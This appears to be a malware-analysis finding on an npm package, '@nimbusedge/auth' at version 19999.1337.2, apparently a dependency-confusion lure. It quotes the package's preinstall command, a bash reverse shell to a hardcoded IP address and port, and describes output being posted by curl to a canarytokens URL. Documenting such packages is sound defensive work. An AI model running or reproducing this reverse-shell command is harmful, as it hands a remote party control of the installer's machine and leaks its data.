summary: preinstall script opens reverse shell and exfiltrates to hardcoded remote host
details: The package.json preinstall lifecycle script executes automatically on `npm install` and runs `bash -i >& /dev/tcp/147.93.157.202/8080`, establishing an interactive reverse shell from the installer's machine to the hardcoded IP 147.93.157.202 on TCP port 8080. The command additionally pipes shell output through `curl -s -m 5 -X POST --data-binary @-` to a plain-HTTP endpoint at http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php, exfiltrating command output over cleartext. The result is full interactive shell access to the installer's host and out-of-band data exfiltration, both triggered without user interaction on install. The package name (`@nimbusedge/auth`) and implausibly high version (`19999.1337.2`) are consistent with a dependency-confusion / typosquat lure targeting an internal `@nimbusedge` scope.
